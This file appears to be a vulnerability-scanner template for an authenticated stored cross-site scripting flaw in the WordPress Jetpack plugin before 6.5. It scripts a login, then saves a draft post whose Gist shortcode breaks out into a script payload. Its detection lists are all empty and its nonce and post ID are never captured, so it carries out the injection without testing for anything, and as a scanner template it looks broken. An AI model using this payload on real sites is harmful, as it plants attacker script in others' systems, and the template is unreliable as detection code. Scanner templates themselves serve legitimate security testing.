id: jetpack-stored-xss
brief:
    title: Jetpack < 6.5 - Stored Cross-Site Scripting
    by: 0x_Akoko
    level: medium
    about: Detected authenticated stored XSS in Jetpack < 6.5 via crafted Gist shortcode.
    label:
        - wordpress
        - wp-plugin
        - wpscan
        - jetpack
        - xss
        - authenticated
        - intrusive
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/wp-login.php'
      head:
        Content-Type: application/x-www-form-urlencoded
      body: log={{username}}&pwd={{password}}&wp-submit=Log+In
      signs: []
    - verb: GET
      to:
        - '{{BaseURL}}/wp-admin/post-new.php'
      signs: []
    - verb: POST
      to:
        - '{{BaseURL}}/wp-admin/post.php'
      head:
        Content-Type: application/x-www-form-urlencoded
      body: _wpnonce={{nonce}}&_wp_http_referer={{referer}}&user_ID={{user_id}}&action=editpost&originalaction=editpost&post_author={{user_id}}&post_type=post&original_post_status=auto-draft&referredby=&_wp_original_http_referer=&auto_draft=1&post_ID={{post_id}}&post_title=XSS+Test&content=[gist]"></script><script>alert(document.domain)</script><script src="[/gist]&post_status=draft&hidden_post_status=draft&visibility=public&hidden_post_visibility=public&mm=12&jj=26&aa=2025&hh=04&mn=18&ss=00&hidden_mm=12&hidden_jj=26&hidden_aa=2025&hidden_hh=04&hidden_mn=18&save=Save+Draft
      signs: []
    - verb: GET
      to:
        - '{{BaseURL}}/wp-admin/post.php?post={{post_id}}&action=edit'
      signs: []
